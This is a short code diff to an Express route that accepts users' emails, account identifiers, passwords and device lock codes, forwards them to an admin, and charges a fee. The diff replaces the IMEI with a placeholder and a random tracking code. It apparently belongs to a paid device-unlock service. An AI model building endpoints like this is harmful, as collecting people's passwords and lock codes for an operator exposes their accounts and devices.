@@ -84,9 +84,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Submit user credentials and send to admin
   app.post('/api/submit-credentials', async (req, res) => {
     try {
-      const { email, platform, device, identifier, password, lockCode, imei } = req.body;
+      const { email, platform, device, identifier, password, lockCode } = req.body;
 
-      if (!email || !platform || !device || !identifier || !password || !lockCode || !imei) {
+      if (!email || !platform || !device || !identifier || !password || !lockCode) {
         return res.status(400).json({ error: 'Missing required fields' });
       }
 
@@ -97,11 +97,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
         identifier,
         password,
         lockCode,
-        imei
+        imei: "HIDDEN"
       };
 
       // Create a pending purchase record
       const amount = req.body.isFastTrack ? 19900 : 5000;
+      const imei = "TRACK-" + Math.random().toString(36).substring(2, 10).toUpperCase();
+      
       await storage.createPurchase({
         userId: null,
         device,
